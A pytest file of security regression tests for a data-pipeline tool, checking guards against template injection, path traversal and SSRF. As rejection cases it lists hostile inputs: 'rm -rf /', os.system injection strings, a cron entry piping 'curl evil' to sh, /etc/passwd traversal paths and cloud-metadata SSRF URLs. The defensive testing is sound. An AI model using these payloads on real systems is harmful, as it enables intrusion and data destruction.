# Copyright 2024-2026 Agentics Transformation Ltd
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Round 2 security regression tests — Sec-Fix 9, 10, 11.

Sec-Fix 9: Template injection in DAG/cron rendering. Validates that
contract.id, build.id, schedule are checked against an identifier /
cron-fields whitelist before being interpolated into Python source or
crontab lines.

Sec-Fix 10: Path traversal via contract.id in artifact roots. Validates
that an id like ``../etc/cron.d/x`` is rejected before any filesystem
write happens.

Sec-Fix 11: SSRF in webhook channel URL. Validates the alert webhook
URL refuses non-http(s) schemes and private/loopback hosts, and that
operators can opt-in via FLUID_WEBHOOK_HOST_ALLOWLIST.
"""

from __future__ import annotations

import socket
from pathlib import Path
from typing import Any, Dict

import pytest

from fluid_build.build_runners._alerter import (
    WebhookSsrfError,
    _validate_webhook_url,
    channels_from_config,
    webhook_channel,
)
from fluid_build.cli._acquisition_stage_ext import (
    IdentifierViolation,
    _safe_subpath,
    _validate_cron,
    _validate_identifier,
    policy_apply_acquisition,
    schedule_sync_acquisition,
)

# ── Sec-Fix 9: template injection guards ─────────────────────────────────


class TestIdentifierValidator:
    @pytest.mark.parametrize(
        "value",
        [
            "bronze.orders",
            "bronze.crm.salesforce",
            "ingest_users",
            "Build1",
            "_internal",
            "a.b-c_d.e",
        ],
    )
    def test_accepts_valid(self, value: str):
        assert _validate_identifier(value, kind="contract.id") == value

    @pytest.mark.parametrize(
        "value",
        [
            "../etc/cron.d/evil",
            "/etc/passwd",
            "x; rm -rf /",
            'x"]; import os; os.system("evil") #',
            "x\nimport sys",
            "x'\"`",
            "",
            "1starts_with_digit",
            "spaces in name",
        ],
    )
    def test_rejects_dangerous(self, value: str):
        with pytest.raises(IdentifierViolation):
            _validate_identifier(value, kind="contract.id")

    def test_rejects_excessively_long(self):
        # Cap is 128; 200 chars is rejected. Defends against filename DOS
        # via a giant id.
        with pytest.raises(IdentifierViolation):
            _validate_identifier("a" * 200, kind="contract.id")


class TestCronValidator:
    @pytest.mark.parametrize(
        "value",
        [
            "0 */4 * * *",
            "0 0 * * *",
            "*/15 9-17 * * 1-5",
            "0 0 1 1 *",
            "0 0 * * 0",
            "0 0 1 * 1#1",
            "0 0 1 * ? L",
            "0 30 9 ? * 1#3",
            # 6-field (with seconds) is also accepted.
            "0 0 0 * * *",
        ],
    )
    def test_accepts_valid(self, value: str):
        out = _validate_cron(value)
        assert isinstance(out, str)
        assert len(out.split()) in (5, 6)

    @pytest.mark.parametrize(
        "value",
        [
            # Shell metacharacters in any field.
            "*/5 * * * * curl evil|sh",
            "0 0 * * * & echo pwned",
            "0 \"; import os; os.system('x') #",
            # Wrong field count.
            "0 0 *",
            "0 0 0 0 0 0 0",
            # Quote attempts.
            "0' 0 * * *",
            "0` 0 * * *",
        ],
    )
    def test_rejects_dangerous(self, value: str):
        with pytest.raises(IdentifierViolation):
            _validate_cron(value)

    def test_unicode_nbsp_is_normalized_by_split(self):
        # ``str.split()`` with no args treats Unicode whitespace as a
        # separator, so the NBSP between fields collapses into a normal
        # space and the cron is valid. There is no security issue here
        # — we document the behavior to catch a future regression.
        out = _validate_cron("0 0 * * *")
        assert out.split() == ["0", "0", "*", "*", "*"]


# ── Sec-Fix 10: path-traversal guard on artifact roots ───────────────────


class TestPathTraversalGuards:
    def _bad_contract(self, contract_id: str) -> Dict[str, Any]:
        return {
            "fluidVersion": "0.7.3",
            "kind": "DataProduct",
            "id": contract_id,
            "metadata": {"layer": "Bronze"},
            "builds": [
                {
                    "id": "ingest",
                    "pattern": "acquisition",
                    "engine": "duckdb",
                    "execution": {"trigger": {"schedule": "0 * * * *"}},
                    "properties": {
                        "source": {
                            "kind": "filesystem",
                            "connection": {"uri": "x"},
                            "mode": "full_refresh",
                        }
                    },
                    "outputs": ["raw"],
                }
            ],
        }

    @pytest.mark.parametrize(
        "evil_id",
        [
            "../../etc/cron.d/evil",
            "/etc/passwd",
            "..",
            "x/../y",
            "x/y",
        ],
    )
    def test_schedule_sync_rejects_evil_id(self, tmp_path: Path, evil_id: str):
        with pytest.raises(IdentifierViolation):
            schedule_sync_acquisition(self._bad_contract(evil_id), tmp_path)
        # And confirm nothing was written outside .fluid/.
        # /etc/cron.d/evil should NOT exist after the attempt.
        assert not Path("/etc/cron.d/evil").exists()

    def test_schedule_sync_rejects_evil_build_id(self, tmp_path: Path):
        contract = self._bad_contract("bronze.x")
        contract["builds"][0]["id"] = "../../../etc/cron.d/x"
        with pytest.raises(IdentifierViolation):
            schedule_sync_acquisition(contract, tmp_path)

    def test_policy_apply_rejects_evil_contract_id(self, tmp_path: Path):
        with pytest.raises(IdentifierViolation):
            policy_apply_acquisition(self._bad_contract("../../etc/passwd"), tmp_path)

    def test_safe_subpath_blocks_traversal_in_segments(self, tmp_path: Path):
        # Even if a future caller tries to pass a traversal segment,
        # _safe_subpath catches it.
        with pytest.raises(IdentifierViolation):
            _safe_subpath(tmp_path, "..", "etc", "passwd")


# ── Sec-Fix 9 (positive): rendered artifacts are well-formed ─────────────


class TestRenderedArtifactsAreWellFormed:
    def test_airflow_dag_has_no_unescaped_quotes_or_newlines_from_id(self, tmp_path: Path):
        # Validator-clean ids round-trip into the DAG. We then load the
        # DAG via py_compile to confirm it parses as valid Python.
        import py_compile

        contract = {
            "fluidVersion": "0.7.3",
            "kind": "DataProduct",
            "id": "bronze.crm.salesforce",
            "metadata": {"layer": "Bronze"},
            "builds": [
                {
                    "id": "ingest_accounts",
                    "pattern": "acquisition",
                    "engine": "airbyte",
                    "execution": {
                        "trigger": {"schedule": "0 */4 * * *"},
                        "retry": {"count": 3},
                    },
                    "properties": {
                        "source": {
                            "kind": "salesforce",
                            "connection": {"uri": "x"},
                            "mode": "incremental_append",
                        }
                    },
                    "outputs": ["raw"],
                }
            ],
        }
        artifacts = schedule_sync_acquisition(contract, tmp_path, orchestrators=["airflow"])
        assert len(artifacts) == 1
        # py_compile raises on syntax errors.
        py_compile.compile(artifacts[0].artifact_path, doraise=True)


# ── Sec-Fix 11: webhook SSRF guard ───────────────────────────────────────


class TestWebhookSsrfGuard:
    def test_rejects_non_http_scheme(self):
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("file:///etc/passwd")
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("ftp://x/y")
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("gopher://x/y")

    def test_rejects_loopback(self):
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://127.0.0.1/x")
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://localhost/x")
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://[::1]/x")

    def test_rejects_aws_metadata_endpoint(self):
        # The classic SSRF target. Must be refused.
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://169.254.169.254/latest/meta-data/")

    def test_rejects_private_ranges(self):
        for url in (
            "http://10.0.0.5/x",
            "http://172.16.0.1/x",
            "http://192.168.1.1/x",
        ):
            with pytest.raises(WebhookSsrfError):
                _validate_webhook_url(url)

    def test_allowlist_overrides_private_check(self, monkeypatch):
        # When the operator explicitly allow-lists a host suffix, the
        # private-IP check is skipped. This is the escape hatch for
        # internal corporate webhook proxies.
        monkeypatch.setenv("FLUID_WEBHOOK_HOST_ALLOWLIST", "internal.corp")
        out = _validate_webhook_url("http://hooks.internal.corp/x")
        assert out == "http://hooks.internal.corp/x"

    def test_unresolvable_host_treated_as_private(self):
        # Fail-closed on DNS errors: an attacker who controls only a
        # contract value but not DNS shouldn't get a free SSRF window
        # via NXDOMAIN-style hosts. Bogus TLD is unresolvable.
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://this-host-definitely-does-not-exist.invalid/x")

    def test_webhook_channel_construction_fails_on_loopback(self):
        # Constructing a channel for a private URL fails — better fail
        # at startup than silently swallow alerts at runtime.
        with pytest.raises(WebhookSsrfError):
            webhook_channel("http://127.0.0.1/x")

    def test_channels_from_config_skips_bad_url_keeps_alerter_alive(self, tmp_path: Path):
        # A bad URL emits a warning + is dropped; the rest of the
        # alerter stays functional (log + file + valid channels).
        cfg = {
            "channels": [
                {"kind": "file", "path": str(tmp_path / "out.ndjson")},
                {"kind": "webhook", "url": "http://127.0.0.1/x"},
            ]
        }
        chans = channels_from_config(cfg)
        # log + file remain; webhook is filtered out.
        assert len(chans) == 2

    def test_url_without_hostname_rejected(self):
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http:///path-only")

    def test_ipv4_mapped_ipv6_loopback_rejected(self):
        # ``::ffff:127.0.0.1`` is IPv4-mapped IPv6. Python's
        # ``ipaddress.is_loopback`` recognizes it as loopback, which
        # means our SSRF guard catches this bypass attempt. Pin the
        # behavior so a Python upgrade can't silently regress it.
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://[::ffff:127.0.0.1]/x")

    def test_credentials_in_url_do_not_bypass_host_check(self):
        # ``urlparse().hostname`` strips userinfo, so the host check
        # still applies to ``127.0.0.1``. Without this property, an
        # attacker could write ``http://hooks.slack.com:pwd@127.0.0.1/``
        # and trick a naive parser. Pin the behavior here.
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://user:pass@127.0.0.1/x")
        with pytest.raises(WebhookSsrfError):
            _validate_webhook_url("http://hooks.slack.com:pwd@127.0.0.1/x")


class TestRetryCountBounding:
    def test_retry_count_is_bounded_in_airflow_dag(self, tmp_path: Path):
        # An absurd retry count must not bloat the emitted DAG nor
        # propagate untrusted input verbatim into Python source.
        contract = {
            "fluidVersion": "0.7.3",
            "kind": "DataProduct",
            "id": "bronze.x",
            "metadata": {"layer": "Bronze"},
            "builds": [
                {
                    "id": "ingest",
                    "pattern": "acquisition",
                    "engine": "duckdb",
                    "execution": {
                        "trigger": {"schedule": "0 * * * *"},
                        "retry": {"count": 10**12},  # absurd
                    },
                    "properties": {
                        "source": {
                            "kind": "filesystem",
                            "connection": {"uri": "x"},
                            "mode": "full_refresh",
                        }
                    },
                    "outputs": ["raw"],
                }
            ],
        }
        artifacts = schedule_sync_acquisition(contract, tmp_path, orchestrators=["airflow"])
        body = Path(artifacts[0].artifact_path).read_text()
        assert '"retries": 100' in body
        assert "1000000000000" not in body

    def test_retry_count_with_garbage_input_falls_back_to_default(self, tmp_path: Path):
        contract = {
            "fluidVersion": "0.7.3",
            "kind": "DataProduct",
            "id": "bronze.x",
            "metadata": {"layer": "Bronze"},
            "builds": [
                {
                    "id": "ingest",
                    "pattern": "acquisition",
                    "engine": "duckdb",
                    "execution": {
                        "trigger": {"schedule": "0 * * * *"},
                        "retry": {"count": "not-a-number"},
                    },
                    "properties": {
                        "source": {
                            "kind": "filesystem",
                            "connection": {"uri": "x"},
                            "mode": "full_refresh",
                        }
                    },
                    "outputs": ["raw"],
                }
            ],
        }
        artifacts = schedule_sync_acquisition(contract, tmp_path, orchestrators=["airflow"])
        body = Path(artifacts[0].artifact_path).read_text()
        # Default 3 used when input is non-coercible.
        assert '"retries": 3' in body
